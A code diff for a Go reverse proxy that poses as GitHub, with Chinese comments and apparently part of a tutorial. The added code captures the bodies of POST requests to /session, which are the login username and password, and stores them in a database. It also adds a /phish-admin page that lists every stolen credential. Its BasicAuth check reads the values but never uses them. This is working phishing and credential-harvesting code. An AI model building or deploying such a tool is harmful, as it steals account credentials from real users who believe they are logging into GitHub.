@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"regexp"
 	"strings"
@@ -70,7 +72,17 @@ func handler(w http.ResponseWriter, r *http.Request) {
 func cloneRequest(r *http.Request) *http.Request {
 	// 取得原請求的 method、body
 	method := r.Method
-	body := r.Body
+
+	// 把 body 讀出來轉成 string
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+
+	// 如果是 POST 到 /session 的請求
+	// 就把 body 存進資料庫內（帳號密碼 GET !!）
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+	body := bytes.NewReader(bodyByte)
 
 	// 取得原請求的 url，把它的域名替換成真正的 Github
 	path := r.URL.Path
@@ -163,13 +175,24 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 	return []byte(bodyStr)
 }
 
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	// 取得使用者輸入的帳號密碼
+	username, password, ok := r.BasicAuth()
+
+	// 用昨天寫好的 db.SelectAll() 撈到所有資料
+	strs := db.SelectAll()
+
+	// 在每個字串之間加兩個換行再傳回前端
+	w.Write([]byte(strings.Join(strs, "\n\n")))
+}
+
 func main() {
-	// http.HandleFunc("/", handler)
-	// log.Fatal(http.ListenAndServe(":8080", nil))
+	// 先連接到 DB
 	db.Connect()
-	db.Insert("Hello World")
-	db.Insert("Hi World")
-	for _, str := range db.SelectAll() {
-		fmt.Println(str)
-	}
+
+	// 路徑是 /phish-admin 才交給 adminHandler 處理
+	http.HandleFunc("/phish-admin", adminHandler)
+
+	http.HandleFunc("/", handler)
+	log.Fatal(http.ListenAndServe(":8080", nil))
 }
